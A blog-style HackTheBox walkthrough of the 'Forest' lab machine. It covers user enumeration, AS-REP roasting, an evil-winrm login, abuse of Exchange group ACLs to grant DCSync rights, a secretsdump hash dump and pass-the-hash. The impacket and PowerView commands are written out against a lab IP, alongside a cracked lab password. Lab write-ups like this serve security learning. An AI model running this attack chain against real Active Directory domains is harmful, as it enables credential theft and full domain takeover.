---
title: "HTB: Forest — DCSync via Exchange Permissions"
date: 2026-06-02
type: writeup
topic: cybersecurity
platform: HackTheBox
category: active-directory
difficulty: easy
tools: [nmap, enum4linux, impacket, bloodhound, evil-winrm, powerview]
outcome: completed
tags: [AS-REP-roasting, DCSync, exchange, bloodhound, windows, privilege-escalation]
audience: [tech]
summary: "Walkthrough of HTB Forest — AS-REP roasting to foothold, then abusing Exchange Windows Permissions ACL to grant DCSync rights and dump all domain hashes."
public: true
---

## Box Info

| | |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Easy |
| Completed | June 2026 |

## My Approach

Forest is a great intro AD box — it chains AS-REP roasting into a BloodHound-discovered ACL path. The Exchange abuse is something I hadn't seen in a real engagement context before, so it was worth taking notes on.

## Enumeration

RPC null session yielded a full user list:

```bash
enum4linux -a 10.10.10.161
```

Pulled ~30 domain users. Piped them through GetNPUsers — `svc-alfresco` had pre-auth disabled.

## Foothold — AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
```

Hash for `svc-alfresco` cracked to `s3rvice` in seconds.

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## Privilege Escalation — Exchange ACL Abuse

BloodHound showed `svc-alfresco` is a member of `Account Operators`, which can add members to `Exchange Windows Permissions`. That group has `WriteDACL` on the domain object — meaning members can grant themselves DCSync rights.

```powershell
# Add svc-alfresco to Exchange Windows Permissions
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco

# Grant DCSync rights via PowerView
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync
```

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161
```

Got Administrator NTLM hash → pass-the-hash → root.

## Key Takeaways

1. **Null sessions still work** — unauth RPC enum on older DCs leaks the full user list
2. **BloodHound is non-negotiable** — I'd never have found the Exchange path manually
3. **Exchange permissions are a gift to attackers** — if Exchange is in the environment, always check `Exchange Windows Permissions` and `Exchange Trusted Subsystem` group memberships

## References

- [SpecterOps: Abusing Exchange](https://posts.specterops.io/abusing-exchange-one-api-call-away-from-domain-admin-2fdcc0d4a549)
